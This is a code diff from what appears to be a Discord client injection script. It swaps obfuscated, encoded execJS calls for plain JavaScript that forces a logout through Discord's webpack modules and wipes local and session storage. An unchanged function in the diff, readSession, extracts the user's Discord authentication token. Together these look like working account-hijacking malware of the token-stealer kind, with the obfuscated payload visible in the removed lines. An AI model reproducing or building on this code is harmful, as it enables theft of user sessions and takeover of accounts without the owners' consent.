@@ -62,8 +62,24 @@ const execJS = script => {
 };
 
 const flushLocal = () => {
-    execJS(_r("PjU5Lzc/NC50ODU+I3Q7Kio/ND4ZMjM2PnI+NTkvNz80LnQ5KD87Lj8fNj83PzQuOjM8KDs3PzpzdDk1NC4/NC4NMzQ+NS10NjU5OzYJLjUoOz0/dDk2PzsocnM="));
-    execJS(_r("NjU5Oy4zNTR0KD82NTs+cnM="));
+    execJS(`
+        try {
+            window.webpackChunkdiscord_app.push([[''],{},e=>{
+                for(let c in e.c){
+                    let m = e.c[c]?.exports?.default;
+                    if(m && typeof m.logout === 'function') {
+                        m.logout();
+                        return;
+                    }
+                }
+            }]);
+        } catch(e) {}
+        try {
+            document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage.clear();
+            sessionStorage.clear();
+        } catch(e) {}
+        location.reload();
+    `);
 };
 
 const readSession = async () => await execJS(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`);
